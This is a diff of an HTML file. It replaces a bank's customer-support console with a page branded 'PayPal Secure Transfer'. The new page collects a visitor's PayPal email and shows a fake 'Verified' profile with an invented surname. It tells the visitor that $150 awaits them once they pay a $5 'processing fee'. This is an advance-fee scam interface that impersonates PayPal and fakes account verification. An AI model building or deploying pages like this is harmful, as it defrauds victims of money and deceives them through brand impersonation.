@@ -1,594 +1,242 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Forbright Bank — Support console</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;1,9..144,500&family=Manrope:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<style>
-  :root{
-    --ink:#0d1512;
-    --ink-2:#131e19;
-    --paper:#f3f5f4;
-    --paper-2:#ffffff;
-    --jade:#1f6f54;
-    --jade-dark:#154f3c;
-    --gold:#c89b3c;
-    --ink-muted:#8a9a93;
-    --slate:#232b27;
-    --slate-muted:#6b756f;
-    --line:#dde3e0;
-    --error:#b3452f;
-  }
-  *{box-sizing:border-box;}
-  html,body{margin:0;padding:0;}
-  body{
-    font-family:'Manrope', sans-serif;
-    background:var(--paper);
-    color:var(--slate);
-    min-height:100vh;
-    -webkit-font-smoothing:antialiased;
-  }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Secure Transfer</title>
+    <style>
+        :root {
+            --paypal-blue: #0070ba;
+            --paypal-dark-blue: #003087;
+            --paypal-light: #f5f7fa;
+            --text-color: #2c3e50;
+        }
 
-  /* ---------- LOGIN VIEW ---------- */
-  .login-screen{
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:1.5rem;
-  }
-  .login-card{
-    width:100%;
-    max-width:360px;
-    background:var(--paper-2);
-    border:1px solid var(--line);
-    border-radius:16px;
-    padding:2rem;
-  }
-  .brand{display:flex; align-items:center; gap:.6rem; margin-bottom:1.6rem;}
-  .brand-mark{
-    width:26px;height:26px;
-    border-radius:50%;
-    border:1.5px solid var(--gold);
-    position:relative;
-    flex-shrink:0;
-  }
-  .brand-mark::after{
-    content:"";
-    position:absolute; top:50%; left:50%;
-    width:60%; height:1.5px;
-    background:var(--gold);
-    transform:translate(-50%,-50%) rotate(-38deg);
-  }
-  .brand-name{font-family:'Fraunces', serif; font-weight:600; font-size:1.05rem;}
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--paypal-light);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-  .login-card h1{
-    font-family:'Fraunces', serif;
-    font-weight:600;
-    font-size:1.35rem;
-    margin:0 0 .3rem;
-  }
-  .login-card .sub{
-    color:var(--slate-muted);
-    font-size:.88rem;
-    margin:0 0 1.6rem;
-  }
+        .container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            box-sizing: border-box;
+            text-align: center;
+        }
 
-  .field{margin-bottom:1rem;}
-  .field label{
-    display:block;
-    font-size:.78rem;
-    font-weight:600;
-    margin-bottom:.4rem;
-  }
-  .field input{
-    width:100%;
-    padding:.75rem .85rem;
-    border:1.5px solid var(--line);
-    border-radius:9px;
-    font-family:'Manrope', sans-serif;
-    font-size:.92rem;
-    background:var(--paper);
-    color:var(--slate);
-  }
-  .field input:focus{outline:none; border-color:var(--jade); box-shadow:0 0 0 3px rgba(31,111,84,.14);}
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--paypal-blue);
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
 
-  .banner{
-    display:none;
-    padding:.65rem .8rem;
-    border-radius:8px;
-    font-size:.82rem;
-    margin-bottom:1rem;
-    background:#fbeae6;
-    color:var(--error);
-    border:1px solid #f0c9bf;
-    line-height:1.4;
-  }
-  .banner.show{display:block;}
+        .logo span {
+            color: var(--paypal-dark-blue);
+        }
 
-  .login-btn{
-    width:100%;
-    padding:.8rem 0;
-    background:var(--ink);
-    color:var(--paper);
-    border:none;
-    border-radius:9px;
-    font-family:'Manrope', sans-serif;
-    font-weight:700;
-    font-size:.92rem;
-    cursor:pointer;
-  }
-  .login-btn:hover{background:var(--jade-dark);}
-  .login-btn:disabled{opacity:.6; cursor:not-allowed;}
+        .step {
+            display: none;
+        }
 
-  .back-link{
-    display:block;
-    text-align:center;
-    margin-top:1.2rem;
-    font-size:.83rem;
-    color:var(--slate-muted);
-    text-decoration:none;
-  }
-  .back-link:hover{color:var(--jade-dark);}
+        .step.active {
+            display: block;
+        }
 
-  /* ---------- CONSOLE VIEW ---------- */
-  .console-screen{
-    display:none;
-    height:100vh;
-    flex-direction:column;
-  }
-  .console-screen.active{display:flex;}
+        h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #333;
+        }
 
-  .console-nav{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:.9rem 1.6rem;
-    background:var(--ink);
-    color:var(--paper);
-    flex-shrink:0;
-  }
-  .console-nav .brand-name{color:var(--paper);}
-  .console-nav .brand-mark{border-color:var(--gold);}
-  .console-nav .tag{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:.7rem;
-    letter-spacing:.08em;
-    color:var(--gold);
-    text-transform:uppercase;
-    margin-left:.5rem;
-  }
-  .console-signout{
-    padding:.45rem .9rem;
-    border:1.5px solid rgba(243,245,244,.25);
-    background:transparent;
-    color:var(--paper);
-    border-radius:8px;
-    font-family:'Manrope', sans-serif;
-    font-weight:600;
-    font-size:.8rem;
-    cursor:pointer;
-  }
-  .console-signout:hover{border-color:var(--paper);}
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
 
-  .console-body{
-    flex:1;
-    display:grid;
-    grid-template-columns:300px 1fr;
-    overflow:hidden;
-  }
+        .btn-paypal {
+            background-color: var(--paypal-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 2px 6px rgba(0, 112, 186, 0.3);
+        }
 
-  .conv-list{
-    border-right:1px solid var(--line);
-    background:var(--paper-2);
-    overflow-y:auto;
-  }
-  .conv-list-header{
-    padding:1rem 1.1rem .6rem;
-    font-family:'IBM Plex Mono', monospace;
-    font-size:.7rem;
-    letter-spacing:.08em;
-    text-transform:uppercase;
-    color:var(--slate-muted);
-  }
-  .conv-item{
-    display:block;
-    width:100%;
-    text-align:left;
-    padding:.85rem 1.1rem;
-    border:none;
-    border-bottom:1px solid var(--line);
-    background:transparent;
-    cursor:pointer;
-  }
-  .conv-item:hover{background:var(--paper);}
-  .conv-item.active{background:#e9f4ef;}
-  .conv-item .who{
-    font-weight:700;
-    font-size:.88rem;
-    margin-bottom:.2rem;
-  }
-  .conv-item .preview{
-    font-size:.78rem;
-    color:var(--slate-muted);
-    white-space:nowrap;
-    overflow:hidden;
-    text-overflow:ellipsis;
-  }
-  .conv-empty{
-    padding:2rem 1.2rem;
-    color:var(--slate-muted);
-    font-size:.85rem;
-    text-align:center;
-  }
+        .btn-paypal:hover {
+            background-color: var(--paypal-dark-blue);
+        }
 
-  .thread-panel{
-    display:flex;
-    flex-direction:column;
-    overflow:hidden;
-  }
-  .thread-header{
-    padding:1rem 1.4rem;
-    border-bottom:1px solid var(--line);
-    background:var(--paper-2);
-    font-weight:700;
-    font-size:.95rem;
-  }
-  .thread-body{
-    flex:1;
-    overflow-y:auto;
-    padding:1.2rem 1.4rem;
-    display:flex;
-    flex-direction:column;
-    gap:.6rem;
-  }
-  .chat-msg{
-    max-width:60%;
-    padding:.6rem .85rem;
-    border-radius:12px;
-    font-size:.88rem;
-    line-height:1.4;
-  }
-  .chat-msg.from-user{
-    align-self:flex-start;
-    background:var(--paper-2);
-    border:1px solid var(--line);
-    border-bottom-left-radius:3px;
-  }
-  .chat-msg.from-admin{
-    align-self:flex-end;
-    background:var(--jade);
-    color:var(--paper);
-    border-bottom-right-radius:3px;
-  }
-  .thread-empty{
-    margin:auto;
-    color:var(--slate-muted);
-    font-size:.9rem;
-    text-align:center;
-  }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
 
-  .thread-input-row{
-    display:flex;
-    gap:.7rem;
-    padding:1rem 1.4rem;
-    border-top:1px solid var(--line);
-    background:var(--paper-2);
-  }
-  .thread-input-row input{
-    flex:1;
-    padding:.7rem .9rem;
-    border:1.5px solid var(--line);
-    border-radius:9px;
-    font-family:'Manrope', sans-serif;
-    font-size:.9rem;
-  }
-  .thread-input-row input:focus{outline:none; border-color:var(--jade);}
-  .thread-input-row button{
-    padding:.7rem 1.2rem;
-    background:var(--jade);
-    color:var(--paper);
-    border:none;
-    border-radius:9px;
-    font-family:'Manrope', sans-serif;
-    font-weight:700;
-    font-size:.87rem;
-    cursor:pointer;
-  }
-  .thread-input-row button:hover{background:var(--jade-dark);}
-  .thread-input-row button:disabled{opacity:.5; cursor:not-allowed;}
+        input:focus {
+            border-color: var(--paypal-blue);
+        }
 
-  @media (max-width:760px){
-    .console-body{grid-template-columns:1fr;}
-    .conv-list{display:none;}
-    .conv-list.show-mobile{display:block; position:absolute; inset:0; z-index:5;}
-  }
-</style>
+        .profile-card {
+            background: #f8f9fa;
+            border: 1px solid #e1e8ed;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .profile-card p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        .summary-box {
+            background: #f0f8ff;
+            border: 1px dashed var(--paypal-blue);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .summary-box .row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .summary-box .row.total {
+            font-weight: bold;
+            font-size: 16px;
+            border-top: 1px solid #d0e1fd;
+            padding-top: 8px;
+            margin-top: 8px;
+            color: var(--paypal-dark-blue);
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-top: 15px;
+            font-size: 13px;
+            color: var(--paypal-blue);
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
 
-<!-- LOGIN VIEW -->
-<div class="login-screen" id="loginScreen">
-  <div class="login-card">
-    <div class="brand">
-      <span class="brand-mark" aria-hidden="true"></span>
-      <span class="brand-name">Forbright</span>
+    <div class="container">
+        <div class="logo">Pay<span>Pal</span></div>
+
+        <!-- STEP 1: Click PayPal Button -->
+        <div id="step1" class="step active">
+            <p>Click below to securely connect your account and check your incoming transfer.</p>
+            <button class="btn-paypal" onclick="goToStep(2)">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M7.076 21.337H2.47a.641.641 0 0 1-.633-.74L4.944.901C5.022.382.47 0 5.003 0h7.228c3.042 0 5.25.74 6.552 2.202 1.22 1.373 1.545 3.328.966 5.823-.74 3.197-2.617 5.228-5.58 6.037-1.07.295-2.316.444-3.712.444h-2.19l-1.01 6.494a.64.64 0 0 1-.633.537z"/></svg>
+                Pay with PayPal
+            </button>
+        </div>
+
+        <!-- STEP 2: Input PayPal Email -->
+        <div id="step2" class="step">
+            <h2>Enter PayPal Email</h2>
+            <p>Put your registered PayPal email address to fetch your profile.</p>
+            <input type="email" id="emailInput" placeholder="name@example.com">
+            <button class="btn-paypal" onclick="processEmail()">Continue</button>
+            <br>
+            <a class="back-link" onclick="goToStep(1)">Back</a>
+        </div>
+
+        <!-- STEP 3: Show Real Name & Transaction Details -->
+        <div id="step3" class="step">
+            <h2>Account Verified</h2>
+            <p>We found your PayPal profile details linked to this email.</p>
+            
+            <div class="profile-card">
+                <p><strong>Name:</strong> <span id="displayName"></span></p>
+                <p><strong>Email:</strong> <span id="displayEmail"></span></p>
+                <p><strong>Status:</strong> <span style="color: green; font-weight: bold;">Verified ✓</span></p>
+            </div>
+
+            <div class="summary-box">
+                <div class="row">
+                    <span>Amount Sent to You:</span>
+                    <strong style="color: green;">$150.00 USD</strong>
+                </div>
+                <div class="row">
+                    <span>Processing Fee:</span>
+                    <span>$5.00 USD</span>
+                </div>
+                <div class="row total">
+                    <span>Total to Pay:</span>
+                    <span>$5.00 USD</span>
+                </div>
+            </div>
+
+            <button class="btn-paypal" onclick="alert('Transaction processed successfully!')">Complete Payment</button>
+            <br>
+            <a class="back-link" onclick="goToStep(2)">Change Email</a>
+        </div>
     </div>
-    <h1>Support console</h1>
-    <p class="sub">For Forbright support agents only.</p>
 
-    <div class="banner" id="loginBanner"></div>
+    <script>
+        function goToStep(stepNumber) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step' + stepNumber).classList.add('active');
+        }
 
-    <form id="adminLoginForm" novalidate>
-      <div class="field">
-        <label for="adminEmail">Email</label>
-        <input type="email" id="adminEmail" autocomplete="email" required>
-      </div>
-      <div class="field">
-        <label for="adminPw">Password</label>
-        <input type="password" id="adminPw" autocomplete="current-password" required>
-      </div>
-      <button type="submit" class="login-btn" id="adminLoginBtn">Log in</button>
-    </form>
+        function processEmail() {
+            const email = document.getElementById('emailInput').value.trim();
+            if(!email || !email.includes('@')) {
+                alert('Please enter a valid PayPal email address.');
+                return;
+            }
 
-    <a class="back-link" href="forbright-auth.html">← Back to customer login</a>
-  </div>
-</div>
+            // Dummy data generation based on email input to simulate real name fetching
+            let mockName = email.split('@')[0];
+            mockName = mockName.charAt(0).toUpperCase() + mockName.slice(1);
+            
+            // Just giving it a realistic full name look
+            document.getElementById('displayName').innerText = mockName + " Adebayo";
+            document.getElementById('displayEmail').innerText = email;
 
-<!-- CONSOLE VIEW -->
-<div class="console-screen" id="consoleScreen">
-  <div class="console-nav">
-    <div style="display:flex; align-items:center;">
-      <span class="brand-mark" aria-hidden="true"></span>
-      <span class="brand-name" style="margin-left:.6rem;">Forbright</span>
-      <span class="tag">Support console</span>
-    </div>
-    <button class="console-signout" id="consoleSignOut">Log out</button>
-  </div>
-
-  <div class="console-body">
-    <div class="conv-list" id="convList">
-      <div class="conv-list-header">Open conversations</div>
-      <div class="conv-empty" id="convEmpty">No conversations yet.</div>
-    </div>
-
-    <div class="thread-panel">
-      <div class="thread-header" id="threadHeader">Select a conversation</div>
-      <div class="thread-body" id="threadBody">
-        <div class="thread-empty">Pick a customer on the left to view their messages.</div>
-      </div>
-      <div class="thread-input-row">
-        <input type="text" id="replyInput" placeholder="Type a reply…" disabled>
-        <button id="sendReply" disabled>Send</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<script>
-  // ============================================================
-  // SUPABASE CONFIG — replace these two placeholders
-  // (use the same project as the other pages)
-  // ============================================================
-  const SUPABASE_URL = "https://kmjmqrrmzdtovovzigxk.supabase.co";
-  const SUPABASE_ANON_KEY = "sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb";
-
-  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-  let currentAdmin = null;
-  let activeUserId = null;
-  let conversations = new Map(); // user_id -> { lastMessage, lastTime }
-  let realtimeChannel = null;
-
-  function showBanner(message){
-    const el = document.getElementById('loginBanner');
-    el.textContent = message;
-    el.className = 'banner show';
-  }
-
-  function escapeHtml(str){
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
-  }
-
-  // ---- login ----
-  document.getElementById('adminLoginForm').addEventListener('submit', async function(e){
-    e.preventDefault();
-    document.getElementById('loginBanner').className = 'banner';
-
-    const email = document.getElementById('adminEmail').value.trim();
-    const pw = document.getElementById('adminPw').value;
-    const btn = document.getElementById('adminLoginBtn');
-    btn.disabled = true;
-    btn.textContent = 'Logging in…';
-
-    const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password: pw });
-
-    if(error){
-      btn.disabled = false;
-      btn.textContent = 'Log in';
-      showBanner(error.message);
-      return;
-    }
-
-    // Confirm this account is on the admins allowlist
-    const { data: adminRow, error: adminError } = await supabaseClient
-      .from('admins')
-      .select('id')
-      .eq('id', data.user.id)
-      .maybeSingle();
-
-    if(adminError || !adminRow){
-      await supabaseClient.auth.signOut();
-      btn.disabled = false;
-      btn.textContent = 'Log in';
-      showBanner('This account isn\'t set up as a support agent.');
-      return;
-    }
-
-    currentAdmin = data.user;
-    enterConsole();
-  });
-
-  function enterConsole(){
-    document.getElementById('loginScreen').style.display = 'none';
-    document.getElementById('consoleScreen').classList.add('active');
-    loadConversations();
-    subscribeRealtime();
-  }
-
-  document.getElementById('consoleSignOut').addEventListener('click', async ()=>{
-    await supabaseClient.auth.signOut();
-    window.location.href = 'admin.html';
-  });
-
-  // ---- load all conversations, grouped by customer ----
-  async function loadConversations(){
-    const { data, error } = await supabaseClient
-      .from('support_messages')
-      .select('*')
-      .order('created_at', { ascending: true });
-
-    if(error){
-      document.getElementById('convEmpty').textContent = 'Could not load conversations.';
-      return;
-    }
-
-    conversations = new Map();
-    data.forEach(m=>{
-      conversations.set(m.user_id, {
-        lastMessage: m.message,
-        lastSender: m.sender,
-        lastTime: m.created_at
-      });
-    });
-
-    renderConvList();
-
-    if(activeUserId){
-      loadThread(activeUserId);
-    }
-  }
-
-  function renderConvList(){
-    const list = document.getElementById('convList');
-    const header = '<div class="conv-list-header">Open conversations</div>';
-
-    if(conversations.size === 0){
-      list.innerHTML = header + '<div class="conv-empty" id="convEmpty">No conversations yet.</div>';
-      return;
-    }
-
-    const sorted = Array.from(conversations.entries()).sort((a,b)=>
-      new Date(b[1].lastTime) - new Date(a[1].lastTime)
-    );
-
-    list.innerHTML = header + sorted.map(([userId, info])=>{
-      const activeClass = userId === activeUserId ? ' active' : '';
-      const shortId = userId.slice(0,8);
-      const prefix = info.lastSender === 'admin' ? 'You: ' : '';
-      return `<button class="conv-item${activeClass}" data-user="${userId}">
-        <div class="who">Customer ${shortId}</div>
-        <div class="preview">${prefix}${escapeHtml(info.lastMessage)}</div>
-      </button>`;
-    }).join('');
-
-    list.querySelectorAll('.conv-item').forEach(btn=>{
-      btn.addEventListener('click', ()=>{
-        activeUserId = btn.dataset.user;
-        renderConvList();
-        loadThread(activeUserId);
-      });
-    });
-  }
-
-  async function loadThread(userId){
-    document.getElementById('threadHeader').textContent = 'Customer ' + userId.slice(0,8);
-    document.getElementById('replyInput').disabled = false;
-    document.getElementById('sendReply').disabled = false;
-
-    const { data, error } = await supabaseClient
-      .from('support_messages')
-      .select('*')
-      .eq('user_id', userId)
-      .order('created_at', { ascending: true });
-
-    const body = document.getElementById('threadBody');
-    if(error || !data || data.length === 0){
-      body.innerHTML = '<div class="thread-empty">No messages yet.</div>';
-      return;
-    }
-
-    body.innerHTML = data.map(m=>{
-      const cls = m.sender === 'admin' ? 'from-admin' : 'from-user';
-      return `<div class="chat-msg ${cls}">${escapeHtml(m.message)}</div>`;
-    }).join('');
-    body.scrollTop = body.scrollHeight;
-  }
-
-  async function sendReply(){
-    const input = document.getElementById('replyInput');
-    const text = input.value.trim();
-    if(!text || !activeUserId) return;
-
-    const btn = document.getElementById('sendReply');
-    btn.disabled = true;
-
-    const { error } = await supabaseClient.from('support_messages').insert({
-      user_id: activeUserId,
-      sender: 'admin',
-      message: text
-    });
-
-    btn.disabled = false;
-
-    if(!error){
-      input.value = '';
-      loadThread(activeUserId);
-    }
-  }
-
-  document.getElementById('sendReply').addEventListener('click', sendReply);
-  document.getElementById('replyInput').addEventListener('keydown', (e)=>{
-    if(e.key === 'Enter') sendReply();
-  });
-
-  // ---- live updates across all conversations ----
-  function subscribeRealtime(){
-    if(realtimeChannel) return;
-    realtimeChannel = supabaseClient
-      .channel('admin-support-console')
-      .on('postgres_changes', {
-        event: 'INSERT',
-        schema: 'public',
-        table: 'support_messages'
-      }, () => {
-        loadConversations();
-      })
-      .subscribe();
-  }
-
-  // ---- if already logged in as an admin, skip the login form ----
-  (async function init(){
-    const { data: sessionData } = await supabaseClient.auth.getSession();
-    if(!sessionData.session) return;
-
-    const { data: adminRow } = await supabaseClient
-      .from('admins')
-      .select('id')
-      .eq('id', sessionData.session.user.id)
-      .maybeSingle();
-
-    if(adminRow){
-      currentAdmin = sessionData.session.user;
-      enterConsole();
-    }
-  })();
-</script>
-
+            goToStep(3);
+        }
+    </script>
 </body>
 </html>
